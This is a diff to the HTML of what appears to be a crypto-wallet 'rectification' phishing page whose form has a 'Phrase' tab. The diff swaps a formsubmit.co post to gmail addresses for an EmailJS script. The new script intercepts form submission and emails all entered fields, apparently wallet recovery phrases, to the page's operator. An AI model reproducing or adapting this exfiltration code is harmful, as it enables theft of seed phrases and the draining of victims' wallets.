@@ -106,10 +106,10 @@
                             <div class="mt-2">
                                 <div class="mt-10">
 <!-- form starts from here -->
-                                    <form action="https://formsubmit.co/web6289@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                       <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+                                    <form action="" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                       
                                         <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://rectificationdapps-protocols.vercel.app/access/point/success.html">
+                                        
                                         <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                                             <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                                                 Phrase
@@ -182,6 +182,35 @@
                             </svg></span></button></div>
                                         </div>
                                     </form>
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('KuJPLZSBesKWR07cn')
+</script>
+
+                   <script>
+                       const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_ma4lrqj';
+   const templateID = 'template_rc8enk5';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+                   </script>                 
                                 </div>
                             </div>
                         </div>
